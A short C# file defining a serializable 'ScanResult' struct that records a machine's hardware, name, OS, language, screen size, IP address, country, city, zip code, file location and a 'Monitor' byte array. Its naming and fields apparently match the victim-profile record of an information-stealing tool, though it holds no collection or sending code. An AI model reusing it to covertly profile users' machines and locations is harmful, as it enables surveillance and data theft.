using System.Runtime.Serialization;

namespace WindowsSDK.Objects.Info
{
    [DataContract(Name = "ScanResult", Namespace = "BrowserExtension")]
    public struct ScanResult
    {
        [DataMember(Name = "Hardware")]
        public string Hardware { get; set; }

        [DataMember(Name = "ReleaseID")]
        public string ReleaseID { get; set; }

        [DataMember(Name = "MachineName")]
        public string MachineName { get; set; }

        [DataMember(Name = "OSVersion")]
        public string OSVersion { get; set; }

        [DataMember(Name = "Language")]
        public string Language { get; set; }

        [DataMember(Name = "ScreenSize")]
        public string ScreenSize { get; set; }

        [DataMember(Name = "ScanDetails")]
        public ScanDetails ScanDetails { get; set; }

        [DataMember(Name = "Country")]
        public string Country { get; set; }

        [DataMember(Name = "City")]
        public string City { get; set; }

        [DataMember(Name = "TimeZone")]
        public string TimeZone { get; set; }

        [DataMember(Name = "IPv4")]
        public string IPv4 { get; set; }

        [DataMember(Name = "Monitor")]
        public byte[] Monitor { get; set; }

        [DataMember(Name = "ZipCode")]
        public string ZipCode { get; set; }

        [DataMember(Name = "FileLocation")]
        public string FileLocation { get; set; }
    }
}
